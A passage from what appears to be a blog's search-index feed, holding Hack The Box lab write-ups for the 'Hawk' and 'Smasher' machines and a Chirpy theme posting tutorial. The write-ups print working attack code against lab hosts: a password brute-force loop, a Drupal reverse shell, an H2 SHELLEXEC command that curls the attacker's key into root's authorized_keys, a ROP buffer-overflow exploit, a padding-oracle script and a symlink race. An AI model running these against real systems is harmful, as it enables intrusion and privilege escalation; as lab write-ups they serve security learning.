10.10.10.102...Connected to 10.10.10.102.Escape character is '^]'.90117FRemote connections to this server are not allowed, see -tcpAllowOthers��\u0001`\u0001�org.h2.jdbc.JdbcSQLException: Remote connections to this server are not allowed, see -tcpAllowOthers [90117-196]  at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)  at org.h2.message.DbException.get(DbException.java:179)  at org.h2.message.DbException.get(DbException.java:155)  at org.h2.message.DbException.get(DbException.java:144)  at org.h2.server.TcpServerThread.run(TcpServerThread.java:82)  at java.base/java.lang.Thread.run(Thread.java:844)Connection closed by foreign host.FTP recon &amp; credentials fileAnonymous access is allowed on the server and there’s a single file we can download.root@violentunicorn:~/hackthebox/Machines/Hawk# ftp 10.10.10.102Connected to 10.10.10.102.220 (vsFTPd 3.0.3)Name (10.10.10.102:root): anonymous230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages226 Directory send OK.ftp&gt; cd messages250 Directory successfully changed.ftp&gt; ls -la200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 .drwxr-xr-x    3 ftp      ftp          4096 Jun 16 22:14 ..-rw-r--r--    1 ftp      ftp           240 Jun 16 22:21 .drupal.txt.enc226 Directory send OK.ftp&gt; get .drupal.txt.enclocal: .drupal.txt.enc remote: .drupal.txt.enc200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).226 Transfer complete.240 bytes received in 0.00 secs (3.4679 MB/s)The file contains a base64 encoded OpenSSL encrypted fileroot@violentunicorn:~/hackthebox/Machines/Hawk# cat drupal.txt.enc U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJbCmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQzQUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfyt4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=root@violentunicorn:~/hackthebox/Machines/Hawk# base64 -d drupal.txt.enc &gt; drupal-decoded.txt.enc root@violentunicorn:~/hackthebox/Machines/Hawk# file drupal-decoded.txt.encdrupal-decoded.txt.enc: openssl enc'd data with salted passwordTo brute-force the file, I’ve tried using bruteforce-salted-openssl but that tools is shit so I made my own script that does the same thing.for pwd in $(cat /root/SecLists/Passwords/rockyou-75.txt)  do openssl enc -aes-256-cbc -d -a -in drupal.txt.enc -out file.txt -k $pwd  if [ $? -eq 0 ]  then    exit 1  fidoneThe file contains a password:root@violentunicorn:~/hackthebox/Machines/Hawk# cat file.txt Daniel,Following the password for the portal:PencilKeyboardScanner123Please let us know when the portal is ready.Kind Regards,IT departmentDrupalSo first we’ll log on to Drupal with:  Username: admin  Password: PencilKeyboardScanner123Next we need to enable PHP filters so we can embed PHP in pages.Then we’ll create a PHP page with a simple reverse shell.root@violentunicorn:~# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.102] 53700/bin/sh: 0: can't access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$ cd /home$ lsdaniel$ cd daniel$ lsuser.txt$ cat user.txtd5111d&lt;redacted&gt;We can find that there is another user: daniel$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinlxd:x:105:65534::/var/lib/lxd/:/bin/falseuuidd:x:106:110::/run/uuidd:/usr/sbin/nologindnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologinpollinate:x:109:1::/var/cache/pollinate:/bin/falsesshd:x:110:65534::/run/sshd:/usr/sbin/nologintomcat:x:1001:46::/opt/tomat/temp:/sbin/nologinmysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/falsedaniel:x:1002:1005::/home/daniel:/usr/bin/python3ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologinDebian-snmp:x:113:116::/var/lib/snmp:/bin/falseGetting access to user danielIn /var/www/html/sites/default/settings.php we find some credentials:$databases = array (  'default' =&gt;   array (    'default' =&gt;     array (      'database' =&gt; 'drupal',      'username' =&gt; 'drupal',      'password' =&gt; 'drupal4hawk',      'host' =&gt; 'localhost',      'port' =&gt; '',      'driver' =&gt; 'mysql',      'prefix' =&gt; '',    ),  ),);Password: drupal4hawkWe can log in as user daniel with this password:root@violentunicorn:~# ssh daniel@10.10.10.102daniel@10.10.10.102's password: Last login: Sun Jul  1 13:46:16 2018 from dead:beef:2::1004Python 3.6.5 (default, Apr  1 2018, 05:46:30) [GCC 7.3.0] on linuxType \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; We can escape this python interactive shell with:&gt;&gt;&gt; import pty&gt;&gt;&gt; pty.spawn(\"/bin/bash\")daniel@hawk:~$ iduid=1002(daniel) gid=1005(daniel) groups=1005(daniel)Privesc using H2 databaseTo access the H2 database remotely, we’ll do an SSH reverse tunnel:daniel@hawk:~$ ssh -R 8082:localhost:8082 root@10.10.14.23The authenticity of host '10.10.14.23 (10.10.14.23)' can't be established.ECDSA key fingerprint is SHA256:F1UaVc5s2w2++Hm8MXsITptkhljyxkLiczC12e3U2nA.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '10.10.14.23' (ECDSA) to the list of known hosts.root@10.10.14.23's password: Linux violentunicorn 4.15.0-kali3-amd64 #1 SMP Debian 4.15.17-1kali1 (2018-04-25) x86_64The programs included with the Kali GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sat Jul 14 18:49:44 2018 from 10.10.10.102We can then access the login page.We have access to the preferences and we can enable remote access.We can’t log in with the default URL because the relative path is causing problems.If we change the URL to something else we can write to, we are able to log in.Next, we’ll use a shellexec() command to gain RCE on the server:In this case we are dropping our SSH public key in the root authorized_keys file:CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() : \"\";  }$$;CALL SHELLEXEC('curl 10.10.14.23/id_rsa.pub -o /root/.ssh/authorized_keys')We can then log in as root and grab the root flag:root@violentunicorn:~/.ssh# ssh root@10.10.10.102Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Sun Jul 15 00:00:21 UTC 2018  System load:  0.03              Processes:            113  Usage of /:   54.1% of 9.78GB   Users logged in:      1  Memory usage: 57%               IP address for ens33: 10.10.10.102  Swap usage:   0% * Meltdown, Spectre and Ubuntu: What are the attack vectors,   how the fixes work, and everything else you need to know   - https://ubu.one/u2Know * Canonical Livepatch is available for installation.   - Reduce system reboots and improve kernel security. Activate at:     https://ubuntu.com/livepatch55 packages can be updated.3 updates are security updates.Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Sat Jul 14 21:09:40 2018root@hawk:~# cat root.txt54f3e8&lt;redacted&gt;"
  },
  
  {
    "title": "Smasher - Hack The Box",
    "url": "/posts/htb-writeup-smasher/",
    "categories": "hackthebox, infosec",
    "tags": "hackthebox, binary exploit",
    "date": "2018-11-24 00:00:00 +0800",
    





    
    "snippet": "Linux / 10.10.10.89This blog post is a writeup of the excellent Hack the Box machine created by dzonerzy.Summary  The webserver used is vulnerable to a path traversal bug and buffer overflow in the...",
    "content": "Linux / 10.10.10.89This blog post is a writeup of the excellent Hack the Box machine created by dzonerzy.Summary  The webserver used is vulnerable to a path traversal bug and buffer overflow in the GET parameter  By using the path traversal bug we can get the Makefile and copy of the webserver executable  The buffer overflow can be solved by leaking libc’s base address and then building a ropchain to ret2libc  To gain user, we have to solve an Oracle padding challenge that gives us the user password  Priv esc is a race condition in a suid root ELF binary, we can swap out the file with a symlink to /root/root.txt to get the root flagTools used  pwntools  https://libc.blukat.me/  https://github.com/twd2/padding-oracle-attack/blob/master/attack.pyNmapQuick port scan reveals a webserver running on a non standard port 1111.root@kali:~/hackthebox# nmap -sC -sV 10.10.10.89Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-11 20:09 EDTNmap scan report for 10.10.10.89Host is up (0.017s latency).Not shown: 998 closed portsPORT     STATE SERVICE         VERSION22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 a6:23:c5:7b:f1:1f:df:68:25:dd:3a:2b:c5:74:00:46 (RSA)|   256 57:81:a5:46:11:33:27:53:2b:99:29:9a:a8:f3:8e:de (ECDSA)|_  256 c5:23:c1:7a:96:d6:5b:c0:c4:a5:f8:37:2e:5d:ce:a0 (ED25519)1111/tcp open  lmsocialserver?| fingerprint-strings: |   FourOhFourRequest, GenericLines, SIPOptions: |     HTTP/1.1 404 Not found|     Server: shenfeng tiny-web-server|     Content-length: 14|     File not found|   GetRequest, HTTPOptions, RTSPRequest: |     HTTP/1.1 200 OK|     Server: shenfeng tiny-web-server|     Content-Type: text/html|     &lt;html&gt;&lt;head&gt;&lt;style&gt;body{font-family: monospace; font-size: 13px;}td {padding: 1.5px 6px;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;|     &lt;tr&gt;&lt;td&gt;&lt;a href=\"index.html\"&gt;index.html&lt;/a&gt;&lt;/td&gt;&lt;td&gt;2018-03-31 00:57&lt;/td&gt;&lt;td&gt;2.1K&lt;/td&gt;&lt;/tr&gt;|_    &lt;/table&gt;&lt;/body&gt;&lt;/html&gt;Web serviceBased on the banner, we know the website is running using the tiny-web-server server application.There’s already an issue documented for this application about a path traversal vulnerability.We can walk the file system by doing a GET ../../../../&lt;file&gt;, and it also works for directories so we can get a directory listing.I wrote a small python script to fix the output and sort the results to make it easier to work with:#!/usr/bin/pythonfrom pwn import *import sysimport requestscontext.log_level = 'info'ls = []r = requests.get('http://10.10.10.89:1111/../../../../../%s' % (sys.argv[1]))if '&lt;tr&gt;' in r.text:    for line in r.text.splitlines():        if '&lt;tr&gt;' in line:            # print(line.split('\"')[1])            ls.append(line.split('\"')[1])    for i in (sorted(ls)):        print(i)else:    print r.textWe find the list of users in /etc/passwdroot@kali:~/hackthebox/Machines/Smasher# python scanner.py /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/falsesyslog:x:104:108::/home/syslog:/bin/false_apt:x:105:65534::/nonexistent:/bin/falsemessagebus:x:106:110::/var/run/dbus:/bin/falseuuidd:x:107:111::/run/uuidd:/bin/falsesshd:x:108:65534::/var/run/sshd:/usr/sbin/nologinwww:x:1000:1000:www,,,:/home/www:/bin/bashsmasher:x:1001:1001:,,,:/home/smasher:/bin/bashwww and smasher home directories are probably where we want to look next:We can’t read the home directory of smasher:root@kali:~/hackthebox/Machines/Smasher# python scanner.py /home/smasherFile not foundBut we can read what’s in www:root@kali:~/hackthebox/Machines/Smasher# python scanner.py /home/www.bash_logout.bashrc.cache/.profile.python_history.ssh/restart.shtiny-web-server/Inside the web server directory, we can see that the Makefile has been modified to disable the stack protector and DEP/NX. This is our hint that we are probably looking at a buffer overflow exploit to get user access on this machine.root@kali:~/hackthebox/Machines/Smasher# python scanner.py /home/www/tiny-web-server.git/MakefileREADME.mdpublic_html/tinytiny.croot@kali:~/hackthebox/Machines/Smasher# python scanner.py /home/www/tiny-web-server/MakefileCC = c99CFLAGS = -Wall -O2# LIB = -lpthreadall: tinytiny: tiny.c    $(CC) $(CFLAGS) -g -fno-stack-protector -z execstack -o tiny tiny.c $(LIB)clean:    rm -f *.o tiny *~Next, we’ll grab the binary file and check if it’s compiled with additional protections:oot@kali:~/hackthebox/Machines/Smasher# nc -nv 10.10.10.89 1111 &gt; tiny(UNKNOWN) [10.10.10.89] 1111 (?) openGET ../../../../home/www/tiny-web-server/tinyWe edit the file with vi and strip the HTTP headers, then we get a clean ELF file:root@kali:~/hackthebox/Machines/Smasher# file tinytiny: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b872377623aa9e081bc7d72c8dbe882f03bf66b7, with debug_info, not strippedroot@kali:~/hackthebox/Machines/Smasher# checksec tiny[*] '/root/hackthebox/Machines/Smasher/tiny'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE    FORTIFY:  EnabledBuffer overflowThere’s an overflow in the GET parameter: if we send more than 568 characters in the GET request it’ll crash. Because we have the binary and we can look around the file system we can:  Check the PLT/GOT offsets in the binary  Determine the libc version running on the target systemTo find the libc base address, we’ll construct a rop chain and use the read function already present in the PLT. By chance, the RDX register is already set to a large value so we don’t need to find a gadget to mess with it. The binary contains POP RDI and POP RSI gadgets so we can pass the right parameters to the read function and dump a chunk of memory.Calculating the libc address is a matter of fetching the read address from the GOT, then substracting its offset (which we know because we have the libc version). After, we’ll calculate the memory address for system, dup2 and the /bin/sh string.We need to build a ROP chain that calls dup2 first so we can redirect stdin and stdout to the socket.The final exploit is:#!/usr/bin/pythonfrom pwn import *import urllibimport sysr = remote('10.10.10.89', 1111)fd = 4offset = 568junk = p64(0xAABBAABBAABBAABB)plt_read = p64(0x400cf0)plt_write = p64(0x400c50)poprdi = p64(0x4011dd)poprsi = p64(0x4011db)payload_stage1 = ''payload_stage1 += 'A' * offsetpayload_stage1 += poprdi + p64(fd)payload_stage1 += poprsi + p64(0x603088) + junkpayload_stage1 += plt_writer.send('GET /%s\\n\\n' % urllib.quote(payload_stage1))buf = r.recv().split('File not found')[1][0:8]read_addr = u64(buf)libc_base = read_addr - 0xf7250    # https://libc.blukat.me/?q=_rtld_global%3A0&amp;l=libc6_2.23-0ubuntu10_amd64system_addr = libc_base + 0x45390str_bin_sh = libc_base + 0x18cd57dup2 = libc_base + 0xf7970log.info('libc base address is: %s' % hex(libc_base))log.info('read address is : %s' % hex(read_addr))log.info('system address is: %s' % hex(system_addr))log.info('dup2 address is: %s' % hex(dup2))log.info('/bin/sh address is: %s' % hex(str_bin_sh))r2 = remote('10.10.10.89', 1111)payload_stage2 = ''payload_stage2 += 'A' * offsetpayload_stage2 += poprdi + p64(fd)payload_stage2 += poprsi + p64(0x0) + junkpayload_stage2 += p64(dup2)payload_stage2 += poprdi + p64(fd)payload_stage2 += poprsi + p64(0x1) + junkpayload_stage2 += p64(dup2)payload_stage2 += poprdi + p64(str_bin_sh)payload_stage2 += p64(system_addr)r2.send('GET /%s\\n\\n' % urllib.quote(payload_stage2))r2.recvuntil('File not found')r2.interactive()The exploit in action:root@kali:~/hackthebox/Machines/Smasher# python exploit.py [+] Opening connection to 10.10.10.89 on port 1111: Done[*] libc base address is: 0x7f561f10e000[*] read address is : 0x7f561f205250[*] system address is: 0x7f561f153390[*] dup2 address is: 0x7f561f205970[*] /bin/sh address is: 0x7f561f29ad57[+] Opening connection to 10.10.10.89 on port 1111: Done[*] Switching to interactive mode$ iduid=1000(www) gid=1000(www) groups=1000(www)After getting that shell, we can add our SSH public key to /home/www/.ssh/authorized_keys so we can log in directly without using the exploit.root@kali:~# ssh www@10.10.10.89Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-124-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantageLast login: Tue Jun 12 01:34:47 2018 from 10.10.14.23Oracle paddingThere’s a hidden service runnning on port 1337 which prompts for a ciphertext string:www@smasher:~$ netstat -panut |more(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (servers and established)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nametcp        0      0 0.0.0.0:1111            0.0.0.0:*               LISTEN      29166/tiny      tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      -               tcp        0      0 0.0.0.0:1338            0.0.0.0:*               LISTEN      8562/socat      tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - www@smasher:~$ nc 127.0.0.1 1337[*] Welcome to AES Checker! (type 'exit' to quit)[!] Crack this one: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==Insert ciphertext: testGeneric error, ignore me!This looks like a challenge which can be solved through an Oracle Padding attack.To solve this we’ll modify the following script: https://github.com/twd2/padding-oracle-attack/blob/master/attack.pyNote: latest version of pwntools needs to be installed for Python3 in order for this to work: pip3 install --upgrade git+https://github.com/arthaud/python3-pwntools.gitimport sysimport timeimport urllibimport urllib.parseimport urllib.requestimport randomimport argparseimport binasciifrom pwn import *import base64def api(data):  print(data)  r = remote(\"10.10.10.89\",1338,level='warn')  r.recvuntil(\"Insert ciphertext: \")  r.sendline(base64.b64encode(binascii.unhexlify(data)))  print(base64.b64encode(binascii.unhexlify(data)))  tmp = r.recvuntil('Insert ciphertext:').decode(\"utf-8\")  r.close()  if 'OK!' in tmp:    return True  if 'Invalid' in tmp:    return Falsedef is_valid(iv, c):  # Test if the padding of (iv ^ c^(-1)) is valid.  data = binascii.hexlify(bytearray(iv)).decode() + binascii.hexlify(bytearray(c)).decode()  # print(data)  return api(data)def attack(data, block_id, is_valid):  if 16 * block_id + 32 &gt; len(data):    print('Block id is too large.')    exit(1)  c_p = list(data[16 * block_id:16 * block_id + 16]) # Previous cipher block  iv = [random.choice(range(256)) for i in range(0, 16)] # *Random* initialization vector is necessary.  c = data[16 * block_id + 16:16 * block_id + 32] # Current cipher block    plain = []  for n in range(1, 17): # Which byte (in reverse order)?    for i in range(0, 256): # All possibilities of iv[-n]      iv[-n] = i      if is_valid(iv, c): # Padding is valid, so (iv[-n] ^ c^(-1)[-n]) is n, (iv[-n] ^ n) is c^(-1)[-n].        break    # print(iv[-n] ^ n ^ c_p[-n], chr(iv[-n] ^ n ^ c_p[-n]))     # Calculate plain text.    # Note: (iv[-n] ^ n) is c^(-1)[-n], so ((iv[-n] ^ n) ^ c_p[-n]) == (c^(-1)[-n] ^ c_p[-n]) is (plain text)[-n].    plain.append(iv[-n] ^ n ^ c_p[-n])    for i in range(1, n + 1):      iv[-i] = iv[-i] ^ n ^ (n + 1)      # Note:      # For futher attack,      # For i in [1, n], we want (new iv[-i] ^ c^(-1)[-i]) to be (n + 1), so that we can attack c^(-1)[-(n + 1)] using padding oracle.      # In particular, for i == n, we want (new iv[-n] ^ c^(-1)[-n]) to be (n + 1), so new iv[-n] should be (c^(-1)[-n] ^ (n + 1)) == ((iv[-n] ^ n) ^ (n + 1)).      # In particular, for i in [1, n - 1], we want (new iv[-i] ^ c^(-1)[-i]) to be (n + 1). Please note that (iv[-i] ^ c^(-1)[-i]) is n, so new iv[-i] should be (c^(-1)[-i] ^ (n + 1)) == ((iv[-i] ^ n) ^ (n + 1))  plain.reverse()  return bytearray(plain)def main():  # Data from http://10.60.0.212:5757/generate  #data_hex = '74b6510402f53b1661b98a2cfee1f1b5d65753e5ca0ccb1356c0ef871a0118bc47c245dcb51dc51efd473e5f63f3a8c94818195d08d01e740f27d07b0893d0cd'  data_hex = '8ab466581ee825231bb410b842ea01d770c2d3c348d3a31b71610e73de2ad0e5cf6df8119be97dc4790f43bafb35d163a3a852a3ab6882a2d8213186a4fb1776'  data = binascii.unhexlify(data_hex)  for i in range(0, 3):    print(attack(data, i, is_valid).decode(), end='')if __name__ == '__main__':  main()We can redirect to the local 1337 port using socat: socat tcp-listen:1338,reuseaddr,fork tcp:localhost:1337Then we’ll launch the script against port 1338 and let it run for a bit:python3 oracler.py &gt; oracler_output.txtA few lines stand out in the output:b'utEFLXzYEkBmxXPAN4g253DC08NI06MbcWEOc94q0OU=' user 'smasher' 42eb200bed0f389985bbe43762f1ba00cf6df8119be97dc4790f43bafb35d163b'CaH58wii128IH3ksvFujmc9t+BGb6X3EeQ9Duvs10WM='is: PaddingOraclde1ffb8adbdc35ac24caa42050f32100a3a852a3ab6882a2d8213186a4fb1776b'ujCJcv+cH+VbLFWs7SPHdaOoUqOraIKi2CExhqT7F3Y='eMaster123\\x06\\x06\\x06\\x06\\x06\\x06rBy putting this back together we get: user 'smasher' is: PaddingOracleMaster123We can log in with that user and get the first flag:root@kali:~# ssh smasher@10.10.10.89smasher@10.10.10.89's password: Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-124-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantageLast login: Tue Jun 12 01:24:51 2018 from 10.10.16.9smasher@smasher:~$ iduid=1001(smasher) gid=1001(smasher) groups=1001(smasher)smasher@smasher:~$ lscrackme.py  socat.sh  user.txtsmasher@smasher:~$ cat user.txtbaabc&lt;redacted&gt;PrivescThere’s a SUID file that’s interesting:smasher@smasher:~$ find / -perm /6000 2&gt;/dev/null/usr/bin/checkersmasher@smasher:~$ checker[+] Welcome to file UID checker 0.1 by dzonerzyMissing argumentssmasher@smasher:~$ file /usr/bin/checker/usr/bin/checker: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=33890d7446199d25dadc438fce63a78c3f377f95, not strippedThere’s a race condition in the file because it sleeps for 1 second before reading the file content, so we can exploit this by:  Creating a dummy file ‘blah’ with some junk it  Launch /usr/bin/checker against ‘blah’, then sleep for 0.5 seconds  Delete ‘blah’ and replace it with a symlink to /root/root.txt  After the programs comes out of the sleep() function, it’ll read root.txt because it’s running as rootsmasher@smasher:~$ rm blah;echo 123 &gt; blah;(/usr/bin/checker blah &amp;);sleep 0.5;rm blah;ln -s /root/root.txt blahrm: cannot remove 'blah': No such file or directory[+] Welcome to file UID checker 0.1 by dzonerzysmasher@smasher:~$ File UID: 1001Data:077af&lt;redacted&gt;Flag: 077af&lt;redacted&gt;"
  },
  
  {
    "title": "Writing a New Post",
    "url": "/posts/write-a-new-post/",
    "categories": "Blogging, Tutorial",
    "tags": "writing",
    "date": "2015-08-08 14:10:00 +0800",
    





    
    "snippet": "This post will guide you how to write a post on Chirpy theme. Even if you have previous experience with Jekyll, this article is worth reading, because many features require specific variables to be...",
    "content": "This post will guide you how to write a post on Chirpy theme. Even if you have previous experience with Jekyll, this article is worth reading, because many features require specific variables to be set.Naming and PathCreate a new file named YYYY-MM-DD-TITLE.EXTENSION and put it in the _posts of the root directory. Please note that the EXTENSION must be one of md and markdown. If you want to save time of creating files, please consider using the plugin Jekyll-Compose to accomplish this.Front MatterBasically, you need to fill the Front Matter as below at the top of the post:---title: TITLEdate: YYYY-MM-DD HH:MM:SS +/-TTTTcategories: [TOP_CATEGORIE, SUB_CATEGORIE]tags: [TAG]     # TAG names should always be lowercase---  The posts’ layout has been set to post by default, so there is no need to add the variable layout in the Front Matter block.Timezone of DateIn order to accurately record the release date of a post, you should not only set up the timezone of _config.yml but also provide the post’s timezone in variable date of its Front Matter block. Format: +/-TTTT, e.g. +0800.Categories and TagsThe categories of each post are designed to contain up to two elements, and the number of elements in tags can be zero to infinity. For instance:---categories: [Animal, Insect]tags: [bee]---Author InformationThe author information of the post usually does not need to be filled in the Front Matter , they will be obtained from variables social.name and the first entry of social.links of the configuration file by default. But you can also override it as follows:Adding author information in _data/authors.yml (If your website doesn’t have this file, don’t hesitate to create one).&lt;author_id&gt;:  name: &lt;full name&gt;  twitter: &lt;twitter_of_author&gt;  url: &lt;homepage_of_author&gt;And then use author to specify a single entry or authors to specify multiple entries:---author: &lt;author_id&gt;                     # for single entry# orauthors: [&lt;author1_id&gt;, &lt;author2_id&gt;]   # for multiple entries---Having said that, the key author can also identify multiple entries.  The benefit of reading the author information from the file _data/authors.yml is that the page will have the meta tag twitter:creator, which enriches the Twitter Cards and is good for SEO.Table of ContentsBy default, the Table of Contents (TOC) is displayed on the right panel of the post. If you want to turn it off globally, go to _config.yml and set the value of variable toc to false. If you want to turn off TOC for a specific post, add the following to the post’s Front Matter:---toc: false---CommentsThe global switch of comments is defined by variable comments.active in the file _config.yml. After selecting a comment system for this variable, comments will be turned on for all posts.If you want to close the comment for a specific post, add the following to the Front Matter of the post:---comments: false---MathematicsFor website performance reasons, the mathematical feature won’t be loaded by default. But it can be enabled by:---math: true---MermaidMermaid is a great diagrams generation tool. To enable it on your post, add the following to the YAML block:---mermaid: true---Then you can use it like other markdown languages: surround the graph code with ```mermaid and ```.ImagesCaptionAdd italics to the next line of an image，then it will become the caption and appear at the bottom of the image:![img-description](/path/to/image)_Image Caption_SizeIn order to prevent the page content layout from shifting when the image is loaded, we should set the width and height for each image:![Desktop View](/assets/img/sample/mockup.png){: width=\"700\" height=\"400\" }Starting from Chirpy v5.0.0, height and width support abbreviations (height → h, width → w). The following example has the same effect as the above:![Desktop View](/assets/img/sample/mockup.png){: w=\"700\" h=\"400\" }PositionBy default, the image is centered, but you can specify the position by using one of the classes normal, left, and right.  Once the position is specified, the image caption should not be added.      Normal position    Image will be left aligned in below sample:    ![Desktop View](/assets/img/sample/mockup.png){: .normal }            Float to the left    ![Desktop View](/assets/img/sample/mockup.png){: .left }            Float to the right    ![Desktop View](/assets/img/sample/mockup.png){: .right }      ShadowThe screenshots of the program window can be considered to show the shadow effect, and the shadow will be visible in the light mode:![Desktop View](/assets/img/sample/mockup.png){: .shadow }CDN URLIf you host the images on the CDN, you can save the time of repeatedly writing the CDN URL by assigning the variable img_cdn of _config.yml file:img_cdn: https://cdn.comOnce img_cdn is assigned, the CDN URL will be added to the path of all images (images of site avatar and posts) starting with /.For instance, when using images:![The flower](/path/to/flower.png)The parsing result will automatically add the CDN prefix https://cdn.com before the image path:&lt;img src=\"https://cdn.com/path/to/flower.png\" alt=\"The flower\"&gt;Image PathWhen a post contains many images, it will be a time-consuming task to repeatedly define the path of the images. To solve this, we can define this path in the YAML block of the post:---img_path: /img/path/---And then, the image source of Markdown can write the file name directly:![The flower](flower.png)The output will be:&lt;img src=\"/img/path/flower.png\" alt=\"The flower\"&gt;Preview ImageIf you want to add an image to the top of the post contents, specify the attribute path, width, height, and alt for the image:---image:  path: /path/to/image  width: 1000   # in pixels  height: 400   # in pixels  alt: image alternative text---Except for alt, all other options are necessary, especially the width and height, which are related to user experience and web page loading performance. The above section “Size” also mentions this.Starting from Chirpy v5.0.0, the attributes height and width can be abbreviated: height → h, width → w. In addition, the img_path can also be passed to the preview image, that is, when it has been set, the  attribute path only needs the image file name.For simple use, you can also just use image to define the path.image: /path/to/imagePinned 